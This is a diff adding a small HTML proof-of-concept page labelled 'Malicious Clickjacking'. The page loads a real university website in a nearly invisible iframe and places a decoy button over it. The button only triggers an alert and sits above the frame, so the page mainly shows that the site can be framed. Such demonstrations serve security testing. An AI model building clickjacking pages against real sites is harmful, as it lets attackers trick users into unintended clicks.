@@ -1,0 +1,24 @@
+<html>
+<head>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0.1; /* Make iframe almost invisible */
+            z-index: 10;
+        }
+        button {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            z-index: 20; /* Ensure button is on top */
+        }
+    </style>
+</head>
+<body>
+    <h1>Malicious Clickjacking</h1>
+    <iframe src="http://www.sliate.ac.lk/" width="800" height="600"></iframe>
+    <button onclick="alert('You clicked the fake button!')">Click Me!</button>
+</body>
+</html>
